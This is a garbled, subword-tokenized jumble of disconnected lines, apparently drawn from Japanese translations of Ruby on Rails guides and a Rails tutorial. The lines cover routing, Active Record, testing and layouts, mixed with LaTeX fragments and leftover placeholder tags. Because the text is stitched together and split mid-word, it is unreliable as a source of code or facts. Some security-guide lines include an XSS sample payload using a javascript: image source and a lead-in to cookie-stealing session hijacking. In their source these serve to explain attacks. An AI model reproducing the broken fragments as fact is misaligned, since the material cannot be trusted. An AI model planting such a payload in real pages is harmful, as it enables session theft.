▁Bootstrap ▁CSS は 、 このような flash の クラス 用に 4 つの スタイル を 持 っています ▁(\ k ode { success }、\ k ode { info }、\ k ode { warning }、\ k ode { danger })▟ また 、 本書 の サンプルアプリケーション では 、 これらの 全て の スタイル を 場合 に応じて 使って い きます 。
▁ rm d ir ▁< ディレクトリ 名 >
▁さらに 、 サイドバー には 小 さ め のユーザー プロフィール 画像 の リンクを 格 子 状 に 並 べ て 表示する 予定です 。
▁ セキュア な 通 信 と 高い パフォーマンス を 確 保 するために 、 本番環境で は SSL と Puma を導入し た
▁1▖ month ▖ from _ now
▁### ▁ アセット と プリコンパイル を 分 離 する
▁\ ref { sec : prerequisites } でも 詳 しく 解説 している とおり 、 Web 開発 は まったく の 初心者 が ち ょ っ と 頑 張 った だけで 簡単に 学 べ る ような もの ではありません 。
▁### ▁ 親
▁最後に 、 セキュリティ の 常 道 として 、 パスワード の長さ 検証 をテストします ▟ 以下のコード では 、 パスワード は 6 文字 以上 であること を要求します 。
▁` ENV [' DAT A BASE _ URL ']` の 情報 よりも database ▖ yml の 情報を 優 先 する 唯 一 の 方法は 、 database ▖ yml で ` " url " ` サブ キー を使用して 明示的に URL 接続 を指定する ことです 。
▁詳細については 以下 を参照してください 。
▁def ▁ authenticate ( controller , ▁& login _ procedure )
▁def ▁re write _ path ( options )
▁ ╼\ end { code }╼╼ ▁% ▁subsection ▁hashes _ and _ symbols ▁( end )╼╼ ▁\ subsection { CSS ▁ revisited } ▁% ▁( fold )╼ ▁\ label { sec : css _ revisited }╼╼
▁GitHub の Issue には 「 機能 リクエスト 」 を 記 入 しないでください 。
▁### ▁ メール送信 時に 配信 オプションを 動的 に 変更 する
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁5
▁"2010-07-27 ▁23:42:00 "▖ to _ time (: local ) ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁23:42:00 ▁+0200 ▁2010
▁* ▁` ActionDispatch :: Callbacks ▖ after ` には 、 リクエスト の 後に 実行 したい コード ブロック を 1 つ 引数として 与 えます 。
▁上の SQL を 日本語 で 書く と 、「 カテゴリ ー が 1 つ あり 、 かつ コメント が 1 つ 以上 ある 、 すべての 記事 を返す 」 となります 。
▁$ ▁bin / rails ▁generate ▁model ▁ Comment ▁article _ id : integer ▁text : text
▁( この マジックカラム の使用 例を \ ref { sec : creating _ user _ objects } から 具体的に 見 ていきます ) 。
▁この コードの 戻り値 は 、\ k ode { params } ハッシュ のバージョン と 、 許可 された 属性 です ▁(\ k ode { : user } 属性 が ない場合は エラー になります ) 。
▁ ワ ン ラ イ ナ ー に 収 ま る 条件 を使用したい場合 に 最適です 。
▁# ▁=> ▁[" 以下の 文字 を含む ことはできません ▁ !
▁C RE A TE ▁T A B LE ▁ products ▁(
▁< div ▁id =" error _ explanation ">
▁上の例では 、 マクロ によって ` size ` の代わりに ` avatar _ size ` が生成されます 。
▁te }╼╼ ▁% ▁section ▁ sass _ and _ the _ asset _ pipeline ▁( end )╼╼ ▁\ section { レイアウト のリンク } ▁% ▁( fold )╼ ▁\ label { sec : layout _ links }╼╼ N o w ▁that ▁we ' ve ▁ finished ▁a ▁site ▁layout ▁with ▁d ec ent ▁styling , ▁it ' s ▁time ▁to ▁start ▁ filling ▁in ▁the ▁links ▁we ' ve ▁ stub b ed ▁out ▁with ▁\ k ode { ' \ # ' } ▖
▁* ▁` _ product ▖ html ▖ erb `
▁JRuby 環境で MySQL を採用する 場合 、` config / database ▖ yml ` の 記 述 方法は 少し 異なります 。
▁ ある クラス で 属性 を定義する と 、 後に その クラスの サブクラス が 作成される ときに 名前 が 衝 突 する リスク が生じ ます 。
▁### ▁` errors ▖ size `
▁class ▁Create As se mb li es A nd Part s ▁< ▁ActiveRecord :: Migration
▁ この節 は 、 データ モデリング の スキル を 向上 させる という 強 い 要 請 に基いて 書かれ ました ▟ 時間 を かけて 身 に 付け ていた だけ れば 幸 い です 。
▁{0}{1} 第 7 章 {/1}{/0} では ユーザーを サンプル アプリ に ログイン できるようにします が 、 このとき 、 送信された もの と 一致する メールアドレス の ユーザーの レコードを データベース の中から 探 し だ す 必要があります 。
▁[ remember ▁me ] ▁ チェックボックス の CSS
▁ 特定の フィールド だけ を 取り出す
▁\ k ode { user _ id } 属性 と同様に 、\ k ode { content } 属性 も 存在する 必要 があり 、 さらに \ emph { マ イ ク ロ } ポスト が 140 文字 より 長 く な らない よう 制限 を加え ます 。
▁ 先ほど の例では 何 の 害 も 生 じ ないので 、 今度は 攻撃者が ユーザーの cookie を 盗 み 出 す 手法 をご紹介します ▁( 攻撃者は これ を使用して ユーザーの セッションを ハイジャック します ) 。
▁ これらは 問題 なく 動作します ▟ これらは 、 実際に \ emph { User ▖ new _ token } や \ emph { User ▖ digest } を使用して \ k ode { 呼び出される } ので 、 おそらく 最も 明 確 な 定義 方法 である と 言 え る でしょう 。
▁# ▁=> ▁#< Client ▁id : ▁1, ▁first _ name : ▁" Lifo ">
▁* ▁` config ▖ action _ view ▖ logger ` は 、 Log 4 r の インターフェイス または デフォルトの Ruby ▁ Logger クラス に従う ロガー を 引数として と ります ▟ この ロガー は 、 Action ▁View からの 情報を ログ出力 するために使用されます 。
▁つまり 、` Time ▖ now ` が ` Time ▖ current yesterday ` と 等 しく な ること があり え る ということです 。
▁| ▁DELETE ▁| ▁ / comments / : id (▖ : format ) ▁| ▁comments # destroy ▁| ▁ sekret _ comment _ path ▁|
▁self を省略した 結果を リスト \ ref { code : password _ reset _ form } に示します 。
▁ デバッグ モード が 既に オン の場合 、`: debug ` オプションは 冗 長 です 。
▁リスト \ ref { code : development _ email _ settings } の ホスト 名 「\ k ode { ’ example ▖ com ’} 」 の 部分 は 各 自 の development 環境 に合わせて 変更 してください 。
▁Micropost モデル は 、 マイクロポスト の内容 を保存する \ k ode { content } 属性 と 、 特定の ユーザー と マイクロポストを 関連付け る \ k ode { user \_ id } 属性 の 2 つの 属性 だけ を持ちます 。
▁ 仮 に 、 あなた が 重要な \ k ode { app / controllers / } ディレクトリ を削除し てしまった と しましょう 。
▁ 既存の レコードを 更新 したい ときには 新たに ` update ` アクション を使用します ▟ この アクション には 、 更新 後 の 属性 を含む ハッシュ を渡すことができます 。
▁Windows ユーザーの 方は \ href { http :// rails install er ▖ org /}{ Rails インストーラ } から インストーラ を ダウンロード してください 。
▁ コントローラ や scaffold を デフォルトの gem セット で生成した 場合 、 通常 JavaScript ファイル や CSS ファイルが 置かれ る 場所に CoffeeScript ファイル と SCSS ファイルが それぞれ 生成されます 。
▁ 特に 、\ k ode { Rails ▖ env ▖ development ?} が \ k ode { true } になる のは 開発環境 に限ら れる ため 、 以下の 埋め込み Ruby
▁` app / controllers / articles _ controller ▖ rb ` を エディタ で 開 き 、` create ` アクションを 次のように 変更します 。
▁ パスワード再設定の \ k ode { edit } アクション
▁### ▁` select _ all `
▁# ▁ 以前の ミ ュ ー テ ー ター 呼び出し 方法
▁#### ▁ ネストした 関連付け を結合する ▁( 複 数 レベル )
▁ ア リ ス は サンプルアプリケーション に ユーザー登録 します ▟ メールアドレス は al ice @ w on d er l and ▖ com です 。
▁ ユーザー登録フォーム が 無 事 に 動 い たら 成功 です ▟ 成功 すると 図 \ ref { fig : signup _ in _ production } のようになります 。
▁Git を使っている 方は 、 この時点で master ブランチ に 変更を マージ してください 。
▁ 以下のコード を見てみましょう 。
▁belongs _ to ▁: order
▁</ tr >
▁ テスト のうち 、1 つ は 失敗する はずです 。
▁# ▁config / environments / test ▖ rb
▁この URL に対応する ルーティングヘルパー は ` publish er _ magazine _ photo _ url ` となります ▟ この ヘルパー を使用する には 毎 回 3 つの 階層 すべて で オブジェクト を指定する 必要があります 。
▁ 同じ コードを 繰り返し 書くこと を 徹 底 的に 避ける ことで 、 コードが 保 守 しやすくなり 、 容易に 拡張 できるように なり 、 そして 何 より バグ を 減 ら す ことができます 。
▁HTML の 色 は 、 16 進 数 ▁( 基 数 が 16 ) ▁ の 3 つの 数値 の 組み合わせ で 表現 され 、 赤 、 緑 、 青 の 三 原 色 に ▁( この 順序 で ) ▁ コード 化 することができます 。
▁上の ルール は 、 Sass を使用して 以下のように 書き 換 え ることができます 。
▁ ローカル 環境で コンパイル する方法 については 次の セクション を参照してください 。
▁ NoMethodError : ▁undefined ▁method ▁` reverse ' ▁for ▁: foobar : Symbol
▁ セッションを RESTful な リソース として モデリング できる と 、 他の RESTful リソース と 統 一 的に 理解 でき て 便利です ▟ ログイン ページ では \ emph { new } で 新しい セッションを 出力 し 、 その ページ で ログイン すると \ emph { create } で セッションを 実際に 作成 して 保存 し 、 ログアウト すると \ emph { destroy } で セッション を破棄する 、 といった 具 合 です 。
▁* ▁ シンボル
▁# ▁ 何か 気 の 利 いた 変更 を行なう
▁ここで 、 第 \ ref { cha : a _ toy _ app } 章 の Users コントローラ や Microposts コントローラ とは異なり 、 StaticPages コントローラは 一般的な REST アクションに 対応 していない ことに注意してください 。
▁Rails ▁4▖1 では JSON の 扱 い が 大きく 変更 された 点が 4 つ あります 。
▁ ファイル名 \ k ode { _ shim ▖ html ▖ erb } の 前の アンダースコア に注目し てください ▟ この アンダースコア は 、 普 遍 的な パーシャル の 命 名 規 約 であり 、 また 、 一 目 見た だけで ディレクトリ 中の すべての パーシャル を 識 別 すること が 可能 になります 。
▁ テスト データ の 準備 は 完了 した ので 、 これ から テストを 書いていきます が 、 今回の テストは や や 単 純 です ▟ 今回の テストでは 、 プロフィール画面 にアクセス した 後に 、 ページ タイトル と ユーザー名 、 Gravatar 、 マイクロポストの 投 稿 数 、 そして ページ 分割 された マイクロポスト 、 といった 順 で テスト していきます 。
▁上の 例 で わかるように 、` default _ scope ` が ` scope ` と ` where ` よりも 前の 場所に マージ されています 。
▁exist ▁config
▁#### # ▁ 条件 付き レイアウト
▁CDN を設定する には 、 Rails アプリケーションが イン ター ネ ッ ト 上で production モード で 運 用 されており 、` example ▖ com ` など のように 誰 でも アクセス できる URL がある 必要があります 。
▁#### ▁ ネスティング 回 数 の 限 界
▁Active ▁Record では 、` joins ` のように 事前 読み込み された 関連付け に対して 条件 を指定することができます が 、[ joins ](# テーブル を結合する ) ▁という 方法 を使用する ことをお勧めします 。
▁` beginning _ of _ minute ` は 、 その 分 の最初の 時点 ▁( h h : m m :00 ) ▁ の タイムスタンプ を返します 。
▁ここでは 、\ href { http :// github ▖ com / thoughtbot / factory _ g ir l } { Factory ▁Girl } を使用して 生成 した ファクトリー を使用します ▟ Factory ▁Girl は 、\ href { http :// thoughtbot ▖ com /}{ thoughtbot } の メンバー が 作成した Ruby ▁gem です 。
▁* ▁ コントローラ レベル のバリデーション は 一度 は や って み た くなる ものです が 、 た いて い 手 に 負 え なく なり 、 テスト も 保 守 も 困難 になり が ち です 。
▁Rack が クエリ パラメータを 解 析 ( parse ) する方法 と Active ▁Record が パラメータを 解 釈 する方法 の 組み合わせ に 問題 があり 、 where 句 が ` IS ▁NULL ` の データベース クエリ を 本 来 の 意図 に 反 して 生成する ことが 可能 になって しま っています 。
▁Ruby ▁on ▁Rails では [ GitHub の Issue ト ラ ッ キ ング ]( https :// github ▖ com / rails / rails / issue s ) 機能 を使用して issue を ト ラ ッ キ ング しています ▟ 主 に バグ や 、 新しい コードの 貢献 に 使用されます 。
▁次の `: format s ` キー は 、 応答 時に 返される テンプレート の フォーマット を示します 。
▁ 特に 、 データベース上の マイクロポストを 全 部 読み だ してから 結果 の配列 に対して \ emph { length } を呼ぶ ような 無駄な ことは \ k ode { していません } ▟ そんな ことを したら 、 マイクロポストの 数 が 増 加 する に つ れ て 効率 が 低 下 してしまいます 。
▁ 有 力 な 候 補 として 様々な もの が考えられます が 、 基本的に は 長 く て ランダム な 文字列 であれば どんな もの でも 構 いません 。
▁ 上で 述べたように 、\ k ode { git ▁branch ▁- D } で トピックブランチ 上の 変更 を破棄する こともできます 。
▁render ▁plain : ▁params [: article ] ▖ inspect
▁\ ref { sec : layout _ link _ tests } のように 、 ▁\ k ode { assert \_ select } を使って 関連 ページの HTML 要素を テスト していきます ▟ これにより 、 今後 う っかり 要素 を変更 して しま って も 気 付ける ようになります 。
▁require ▁' active _ support / core _ ext / object '
▁これ を使用して 、 に せ の リダイレクト 、 XSS 、 HTTP レスポンス 分割 攻 撃 が 行われ る可能性があります 。
▁SQLite は 開発 用 ・ テスト 用 であれば 問題 なく 使用できます が 、 本番 で の使用 には 耐 えられ ない 可能性があります 。
▁WARNING : ▁` parent _ name ` は 上の 場合 でも ` nil ` を返します 。
▁end _ of _ week ▁( at _ end _ of _ week )
▁customer _ name : ▁" John ▁Doe ")
▁# ▁# ▁=> ▁< label ▁for =" article _ title "> A ▁short ▁title </ label >
▁` Range ` の拡張
▁“ Home ” ▁ や ▁“ About ” ▁ のような 定 番 の 静的なページ がない
▁orphan ▖ reachable ?
▁=> ▁" The ▁D u de "
▁{0} 図 2 ▖4{/0}{1} Users リソース ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁ ページ の最初の 状態 ▟\ href { http :// railstutorial ▖ org / images / figures / demo _ blank _ user _ index _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁ デフォルトの スコープ は 、 条件 を 連 鎖 した 場合に オーバーライド され なくなりました 。
▁リスト \ ref { code : test _ helper _ sessions } のコード を使用すると 、 ユーザー登録 の 終 わ った ユーザーがログイン 状態 になっている かどうかを確認 できます ▁( リスト \ ref { code : login _ after _ signup _ test }) 。
▁Bitbucket の リポジトリ ページ 。
▁さらに 、 メールアドレスを ユーザーがログイン するとき の 一意 の ユーザー名 として 使 お う と している ので 、 メールアドレスが データベース 内で 重複 すること の ないようにする 必要もあります 。
▁* ▁` config ▖ i 18 n ▖ default _ locale ` は 、 アプリケーションの i 18 n で使用する デフォルトの ロケール を設定します 。
▁* ▁` before _ eager _ load `: ▁これは 、 事前 一括読み込み が 行われ る 前に 直接 実行されます ▟ これは ` production ` 環境では デフォルトの 動作 ですが 、` development ` 環境では 異なります 。
▁# ▁Rails 定数 を 委譲 する
▁リスト { p 0} では {2} maximum {/2} を使って ユーザー名 の 最 大文字 数を 制限 していました が 、 これ と 似 た ような 形式 の {2} minimum {/2} という オプション を使って 、 最 小文字 数 のバリデーション を実装する ことができます 。
▁リスト \ ref { code : has _ many _ following _ through _ active _ relationships } で定義した 関連付け により 、 フォローしているユーザー を 配列 の 様 に 扱えるように なり ました 。
▁( 詳細は 第 \ ref { cha : modeling _ users } 章 で説明します が 、 この ユーザー情報 は 、 Web アプリケーションの 背 後 にある データベースに保存 されています ▟)
▁# ▁You ▁can ▁have ▁the ▁root ▁of ▁your ▁site ▁route d ▁with ▁" root "
▁### ▁ その他の セキュリティ 対策
▁ サンプルアプリケーション に 動的な ページ を追加する 準備 として 、 ここで Web サイトの レイアウト に デバッグ情報 を追加しましょう ▁( リスト \ ref { code : rails _ debug }) 。
▁### ▁` exclusion `
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products ▁%>
▁この メソッドを使用して 修正 した バージョン を以下に示します 。
▁@ current _ user ▖ special ? ▁?
▁<% ▁@ articles ▖ each ▁do ▁| article | ▁%>
▁` get utc ` は このメソッド の別名 です 。
▁ 手順 としては 、 まずは 開発環境 用の β 版 を実装 し 、 その後 、 いくつかの 改 善 を と お して 本番環境 用の 完成 版 を 実装します 。
▁次に master ブランチ に移動し 、\ ref { sec : git _ commands } { p 2 } と 同じ要領で 差 分 を マージ します 。
▁この章では インストール 、 開発環境 の設定 、 バージョン管理 、 本番環境 への デプロイ など 、 多くの 課題 を 達 成 しました 。
▁### ▁ 命 名 ルール
▁#### ▁options _ from _ collection _ for _ select
▁#### ▁ atom _ feed
▁ユーザーの 作成 、 表示 、 編集 方法 について 説明しました ので 、 今度は ユーザーを削除 してみましょう ▁({0}{1} 図 2▖1 0 {/1}{/0} ) 。
▁ もう 1 つ は \ k ode { any ?} メソッドです ▟ これは \ k ode { empty ?} メソッドと 互 い に 補 完 します 。
▁リスト \ ref { code : hello _ root _ route } で 以下の 変更を 行った ことを思い出してください 。
▁これらの 計算 は 、 内部で ` since ` メソッド や ` advance ` メソッド に置き換えられます 。
▁( 本チュートリアル では 、 リスト \ ref { code : email _ downcase } の コールバック 処理 で 小文字 変換 された メールアドレスを 利用 している ため 、 ここで 小文字 変換 を 入 れ なくても 結果は 同じです ▟ ただし 、 将来 \ k ode { gravatar _ for } メソッドが 別の 場所 から 呼 び だ される 可能性 を 考え ると 、 ここで 小文字 変換 を 入 れ ること には 意 義 があります ▟)
▁* ▁Ajax の基礎
▁これで \ href { http :// localhost :3000/ } { http :// localhost :3000/ } で デモアプリケーション を ブラウザ 表示 できるように な っている はずです 。
▁ アセット ファイル名 に 別の 拡張子 を追加する ことにより 、 プ リ プロセス 時に 別の レ イ ヤ を追加 で リクエスト することができます ▟ アセット ファイル名 の 拡張子 は 、「 右 から 左 」 の 順に 処理 されます 。
▁* ▁` update !
▁yield (: new s _ content ) ▁: ▁yield ▁%>
▁### ▁ ミドルウェア を設定する
▁ Math ▖ qualified _ const _ get (" E ") ▁# ▁=> ▁2▖ 7 18 28 18 28 4 59 04 5
▁` test ` ディレクトリ は 、 エンジン が テスト を行なう ための 場所 です 。
▁上 によって 以下 が生成されます 。
▁Rails の 初期 画面 である 「 Welcome ▁a board 」 ページ は 、 新しい Rails アプリケーションの ▁ _ ス モ ー ク テスト _ ▁ として 使 えます ▟ この ページ が表示され れば 、 サーバー が 正常に動作し ていること まで は 確 認 できた ことになります 。
▁Web 経由で ユーザー を作成する 機能を これ から 追加します ので 、\ ref { sec : creating _ a _ user } で作成した ユーザーを ここで 削除 しておきましょう 。
▁上 では 、 文字列を 配列 に変換 するのに \ k ode { split } を使用しました 。
▁self を省略した 結果を リスト \ ref { code : edit _ tests _ signed _ in } に示します 。
▁この IP アドレス は 、 この マシン に設定され ている すべての IP アドレス で 受 信 待 ち ▁( list en ) ▁ する ように 指定 しています ▟ これにより 、\ k ode { 1 27 ▖ 0 ▖ 0 ▖ 1 } ( \ k ode { localhost }) という 特別な アドレス で アプリケーションを ブ ラ ウ ズ できます 。
▁ ダ ミ ー の Rails アプリ で 変更 をテストする 必要がある 場合は 、` rails ▁new ` に ` - - dev ` フラグ を追加する と 、 ローカル ブランチ を使用する アプリケーション が生成されます 。
▁この コントローラの クラスは 、 以下のように ` Blorgh ` モジュール 内で 定義 されます 。
▁Article ▖ includes (: comments )▖ where ( comments : ▁ { ▁ visible : ▁true ▁ })
▁ ユーザ の マイクロポストの 場合には 、 こう なります 。
▁これらの オプションは 、 単 一 の メソッド名 または メソッド名 の配列 を 引数として 受 け 取り ます ▟ 渡す メソッド名 は コントローラ内の メソッド名 に 対応 します 。
▁end { enumerate }╼╼ ▁% ▁subsection ▁a _ class _ of _ our _ own ▁( end )╼╼ ▁\ subsection { 組 込 み クラスの 変更 } ▁% ▁( fold )╼ ▁\ label { sec : modify ing _ built _ in _ classes }╼╼
▁次の コード では 空の example _ user を作成します ▟ 次に 、 対応する 属性 に それぞれ 手動で 値を 代入 することで 、 名前とメールアドレス を与え ます ▁(\ k ode { {1} リスト 4 ▖ 1 3 {/1} } で {2} attr _ accessor {/2} を使用している ので 、 ア ト リ ビュー ト ア ク セ サ を使用して 代入 できます ) 。
▁ 静的なページ の作成 は 、 第 \ ref { cha : a _ toy _ app } 章で scaffold 生成 に 使用 した ▁\ k ode { generate } ▁ スクリプト で 、 コントローラを生成 することから始め ます 。
▁なお 、 Heroku に 展開 するときに エラーが発生し た場合 は 、 以下のコマンドを実行し て 本番環境 の ログ を取得し てください ▟ この ログ は 、 問題 を 特定 するときに 役 立 ち ます 。
▁ 各 ビューを 更新 した結果 を 、 リスト \ ref { code : signup _ errors _ updated } 、 リスト \ ref { code : password _ reset _ updated } 、 リスト \ ref { code : edit _ errors _ updated } に示します 。
▁# ▁上のコードは 以下のように 変更 する 必要がある
▁という の も 、 専 門 用 語 として の 「 暗 号 」 という のは 、 設計 上 \ emph { 元に戻す } ことができる こと を指します ▁( 暗号化 できる という 文 には 、\ emph { 復 号 も できる } という ニ ュ ア ン ス が含まれます ) 。
▁次の 問題 は 、 ワーム の 作 者 が CSRF セキュリティ トークン を利用して いた ことで した 。
▁という ことで 、 ユーザー のとき と同じ で ▁( リスト \ ref { code : empty _ fixtures } で fixture の内容を 削除 した ように ) 、 今 の 時点 では 生成された リレーションシップ 用の fixture ファイル も 空 に しておきましょう ▁( リスト \ ref { code : empty _ relationship _ fixture }) 。
▁ queue _ as ▁: default
▁HTML 構造 を削除し た Help ページ ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / except ▖ rb ` です 。
▁ 認 証 ▁( authentication ) ▁ と 認可 ▁( authorization ) ▁ の システム の例 だと 、\ href { http :// github ▖ com / thoughtbot / clear ance } { C le ar ance }、\ href { http :// github ▖ com / bin ary log ic / authlogic } { A u th log ic }、\ href { http :// github ▖ com / plat a format ec / devise } { Devise }、\ href { http :// r ailscasts ▖ com / episodes /1 92 - authorization - with - can can } { C an C an } など があります ▁( Rails に限ら なければ \ href { http :// en ▖ w ikipedia ▖ org / wiki / O p en ID } { O p en ID } や \ href { http :// en ▖ w ikipedia ▖ org / wiki / O a u th } { O A u th } の 上に 構 築 する方法 もあります ) 。
▁` <%= ` タグ を使用して `@ article ▖ author ` を出力する と 、` to _ s ` メソッドが この オブジェクトに対して 呼び出され ます 。
▁\ k ode { pluralize } を使用することで 、 コード は以下のようになります 。
▁ここで 、 有効化トークン と メール をそれぞれ {0} params [: id ] {/0} と {0} params [: email ] {/0} で 参 照 できる ▁( { p 1 }) ▁ ことを 思い 出 してみましょう 。
▁i ▖ name ▁= ▁' J one s '
▁ body ▁i 18 n ▖ t ▁: body , ▁user _ name : ▁user ▖ name
▁変更の結果 、 レイアウトファイル は {0}{1} リスト 3 ▖ 32 {/1}{/0} のようになります 。
▁ これはリスト \ ref { code : _ close _ browser } で使用されていました 。
▁`: host ` に 指定 する 値は その アプリケーション 内で 共通 である のが 普通 なので 、` config / application ▖ rb ` に 以下の 記 述 を追加して グローバル に 利用 できるようにします 。
▁ 必要であれば 複 数 行 に わ た って エントリ を 記 入 したり 、 スペース 4 つの インデント を 置 いた コード 例を 記 入 したり することもできます 。
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁photos # show ▁| ▁image _ path (: id ) ▁|
▁ 一方で 、 User モデル に対する 簡単な In ▁this ▁case , ▁it ’ s ▁easy ▁to ▁write ▁a ▁short ▁test ▁for ▁the ▁User ▁model , ▁in ▁which ▁we ▁use ▁\ k ode { following ?}
▁この キャッシュ は スレッド セ ー フ ではなく 、 単 一 スレッド 用の 一時 メモリ キャッシュ として 機能 すること のみ を 意図 している ことにご注意ください 。
▁errors ▖ add (: discount , ▁" 合 計 額 を 上 回 る ことはできません ")
▁</ html >
▁ 本 セクション では 、 多くの CDN における 一般的な キャッシュ の動作 について解説します ▟ プロ バ イ ダ によって はこの 記 述 のとおり でない ことがあります のでご注意ください 。
▁` Class ` の拡張
▁ 文字列を \ emph { 出力 } するために 、 Ruby の 関数 で 最も 一般に 使われ る のは \ k ode { puts } です ▁( put の 三 人 称 単 数 現在 形 ではなく 「 put ▁string 」 なので 、「 put ▁ ess 」 と発音します ) 。
▁concern は ルーティング 内の どのような 場所に でも 配置 することができます ▟ スコープ や 名前空間 呼び出し で の使用 法 は 以下の とおり です 。
▁ 設定 の 落とし 穴
▁ ブロック で 使用 可能な メソッドの 完全な リスト は 以下の とおり です 。
▁self を省略した 結果を リスト \ ref { code : bootstrap _ js } に示します 。
▁< ul >< li >`: location ` ▁- ▁ sendmail の実行 可能 ファイルの 場所 を指定する 。
▁TIP : ▁development モード ▁( これは Rails のデフォルトの モード です ) ▁ では 、 Rails は リクエスト の たびに アプリケーション を再 読み込み します ▟ これは 開発 を や り やすくするため であり 、 変更 を行なう たびに Rails の Web サーバーを再起動 する必要はありません 。
▁この メッセージ を表示し たくない のであれば 、\ href { http :// l m gt fy ▖ com / ? q = invalid + multi by te + character } { エラーメッセージ を グ グ って } 対応 してください 。
▁\ k ode { update \_ attributes } メソッドは \ k ode { update } メソッドの エイリアス ですが 、 単 一 属性 を変更する \ k ode { update \_ attribute } メソッドと の違い を 明 確 に するために 、 筆者 は 長い メソッド名 の方 を 好 んで 使 っています 。
▁< img ▁src = javascript : alert (' Hello ') >
▁( 実際 、\ ref { sec : demo _ users _ resource } や \ ref { sec : microposts _ resource } でも 説明したように 、\ text tt { rails ▁generate } を実行すると ルーティング の \ text tt { routes ▖ rb } ファイル も 自動的に 変更 される ので 、 これも 元に戻 さ なくてはなりません ) 。
▁ それぞれの アクションは 、 情報を 集 めて ビュー に 送 り 出 す のが 役 割 です 。
▁* ▁` active _ support ▖ initialize _ time _ zone `: ▁` config ▖ time _ zone ` の設定 に基いて アプリケーションの デフォルト タイムゾーン を設定します ▟ デフォルト値 は " UT C " です 。
▁\ ref { sec : requiring _ signed _ in _ users } と \ ref { sec : requiring _ the _ right _ user } と同じように 、 今回は before フィルター を使って \ k ode { destroy } アクション へのアクセス を 制御 します 。
▁exist ▁app / views / users
▁ Turbolinks
▁( 念のため 、\ href { http :// help ▖ github ▖ com / key - setup - redirect } { GitHub の SSH キー 作成 方法 の チュートリアル } を 先に 読んで おいてください ) 。
▁ フォローしているユーザー 用 ページのモックアップ
▁ い った い 何 が 問題 な のでしょうか 。
▁class ▁Re present a tive ▁< ▁ActiveRecord :: Base
▁**` ActionDispatch :: Flash ` **
▁Rails チーム が 特定の API を どのように 扱 っている か を知り たい場合は 、 お 気 軽 に チ ケ ッ ト を 発行し て [ issue ▁ track er ]( https :// github ▖ com / rails / rails / issue s ) に パッチ を 送 ってください 。
▁ ユーザー情報 を表示する ための 仮 の ビュー
▁ ╼ ▁* = ▁require _ tree ▁ ▖
▁ アップグレード 後に アプリケーションが 正常に動作し ている ことを確認する 方法 としては 、 良い テスト カ バ レ ッ ジ を アップグレード 前に 準備 しておく のが 最 善 です 。
▁Web 開発 を 最初から 体 系 的に 学 び たい場合 や 、 プログラミング の 経験 が 全 く ない場合は 、 Ruby を 最初に 学ぶ のが よいでしょう ▟ Ruby を学ぶ のであれば 、 P eter ▁Cooper の 「\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby } }」 がお勧めです 。
▁@ open _ order ▁= ▁@ open _ orders ▖ first ▁# ▁ここで 初めて データベース への クエリ が 行われ る
▁User ▖ all ▖ each ▁do ▁| user |
▁ 完全な アプリケーション コードをリスト \ ref { code : settings _ link } に示します 。
▁#### ▁ リダイレクト の ステータスコード を変更する
▁ アカウント有効化 ▁(\ ref { sec : account _ activations _ resource }) ▁ の場合と同様 、 最初に 新しい リソース で使用する コントローラを生成 します 。
▁get ▁' / patients / : id ', ▁to : ▁' patients # show ', ▁as : ▁' patient '
▁ 12345 67 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁M illion "
▁# ▁この ファイルを 変更 後 サーバー を 必ず 再起動 してください 。
▁\ k ode { pluralize } の最初の 引数に 整 数 が与えられ ると 、 それ に基づいて 2 番目の 引数 の 英 単語 を 複数形 に 変更 したものを 返します 。
▁これは 以下のように 実装 できます 。
▁この sqlite 3 という gem のバージョン を指定する 主な 方法は 2 とおり あります ▟ これにより 、 Rails で使用される gem のバージョン を 「 ある程度 」 制御 できます 。
▁{0} 図 11 ▖ 7 {/0} ▁{1} ユーザー プロフィール ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) ▁ と マイクロポスト {/1}
▁ リダイレクト 先 が 正しい かどうかをチェックします 。
▁ アプリケーションに この エンジン を 後 から インクルード するには 、` Gemfile ` に 以下の行 を追加します 。
▁following
▁ レイアウト のリンク に対するテスト ▁( ▁\ passing ▁ )
▁#### ▁` c attr _ reader `、` c attr _ writer `、` c attr _ accessor `
▁\ href { http :// p eep code ▖ com /}{ PeepCode } : ▁ 質 の高い 商 用の スクリーンキャスト
▁作成した コードをリスト \ ref { code : initial _ working _ feed } に示します
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁photos # edit ▁| ▁edit _ image _ path (: id ) ▁|
▁しかし 、` show ` アクション のコードは そこで ▁ _ 止 ま らない _ ▁ ことにご注意ください ▟ ` show ` アクション のコードは 最 終 行 まで 実行 され 、` regular _ show ` ビューの レンダリング を 行 お う と し た時点で エラーが発生し ます 。
▁### ▁`: if ` や `: unless ` で シンボル を使用する
▁リスト \ ref { code : user _ logout _ test } のとき
▁リスト \ ref { code : sample _ relationships } を実行して データベース上の サンプルデータを 作り 直 す ために 、 い つ もの コマンドを実行 しましょう 。
▁Sprockets は ` config ▖ assets ▖ paths ` で 指定した パス も 探 索 します ▟ この パス には 、 標準的な アプリケーション パス と 、 Rails エンジン によって 追加される すべての パス が含まれます 。
▁ 自動的に 以下のコード に置き換えられます 。
▁=> ▁2
▁* ▁` group `
▁{0} 図 8 ▖ 1 {/0} {1} サインイン フォーム のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / signin _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁\ k ode { Gemfile } に Factory ▁Girl を追加する 。
▁ そのために は \ k ode { paginate } メソッド が必要です ▟ このメソッド については この後 説明します 。
▁ バージョン 1 ▖ 11 ▖ x 以降 の RVM を使用し ていれば 、 インストール された gem は自動的に 適切な Bundler の 環境で 実行されます ので 、 それ 以上 何も し なくても 以下のように bundle ▁exec を省略 して で 実行 できます 。
▁\ k ode { before } ブロック を使用することで この 冗 長 箇所 を 除 く ことができます 。
